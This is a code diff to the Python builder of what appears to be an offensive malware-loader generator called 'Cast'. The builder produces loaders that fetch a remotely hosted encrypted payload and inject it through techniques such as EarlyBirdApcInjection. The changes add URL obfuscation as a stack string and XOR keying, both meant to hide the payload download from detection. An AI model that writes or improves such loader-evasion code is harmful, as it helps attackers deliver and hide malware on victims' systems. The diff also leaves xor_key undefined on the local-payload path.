@@ -2,6 +2,7 @@ import os
 import time
 import json
 import random
+from Cast.urlfuscation import *
 from Cast.cli import *
 from Cast.local_load import *
 from Cast.encryptor import *
@@ -60,7 +61,7 @@ def build_template(Path, Url, Encryption, Enumeration, ProcessName, Loader, Deco
     with open(Path, "w") as file:
         json.dump(data, file, indent=4)
 
-def build_main(Payload_Location, Url, Encryption, Enumeration, Payload, ProcessName, Loader, Decoy, ApiMode):
+def build_main(Payload_Location, Url, Encryption, Enumeration, Payload, ProcessName, Loader, Decoy, ApiMode, xor_key):
     Path = input(f"""\nPath for the final build (Default .\\Build):
 
     >> """)
@@ -96,7 +97,7 @@ def build_main(Payload_Location, Url, Encryption, Enumeration, Payload, ProcessN
             print(f"""
 \n[!!]NOTE[!!]
 Encrypted Payload is saved as encrypted.bin
-Please host the encrypted.bin at {Url}
+Please host the encrypted.bin at the URL you provided.
 [!!]NOTE[!!]\n""")
 
     if not build_template(build_folder, Url, Encryption, Enumeration, ProcessName, Loader, Decoy, ApiMode):
@@ -106,7 +107,7 @@ Please host the encrypted.bin at {Url}
     
     Control_String = random.randint(100000, 999999)
 
-    if not build(Path, build_folder, Encryption, Enumeration, Payload, ProcessName, Loader, Url, Decoy, Control_String):
+    if not build(Path, build_folder, Encryption, Enumeration, Payload, ProcessName, Loader, Url, Decoy, Control_String, xor_key):
         print(f"""
 [+] Loader Built Successfully! At {build_folder}
     
@@ -123,6 +124,8 @@ def main():
     if Payload_Location == "2":
         Url = set_url()
         Payload = remote_payload_fetch(Url)
+        Url = url_obfuscated_stack_string(Url)
+        xor_key = calculate_xor_key()
     else:
         Payload = local_payload_fetch()
         Url = "null"
@@ -165,7 +168,7 @@ You want to use EarlyBirdApcInjection with a process creatin technique?
                 print(f"\n[!] Exiting...")
                 exit(0)
         change_header_file(Enumeration, Loader, ApiMode)
-        build_main(Payload_Location, Url, Encryption, Enumeration, Payload, ProcessName, Loader, Decoy, ApiMode)
+        build_main(Payload_Location, Url, Encryption, Enumeration, Payload, ProcessName, Loader, Decoy, ApiMode,xor_key)
         restore_header_file(Enumeration, Loader, ApiMode)
         return
     else:
@@ -201,7 +204,7 @@ You want to use EarlyBirdApcInjection with a process creatin technique?
 
     Decoy = set_decoy()
 
-    build_main(Payload_Location, Url, Encryption, Enumeration, Payload, ProcessName, Loader, Decoy, ApiMode)
+    build_main(Payload_Location, Url, Encryption, Enumeration, Payload, ProcessName, Loader, Decoy, ApiMode, xor_key)
 
     restore_header_file(Enumeration, Loader, ApiMode)
 
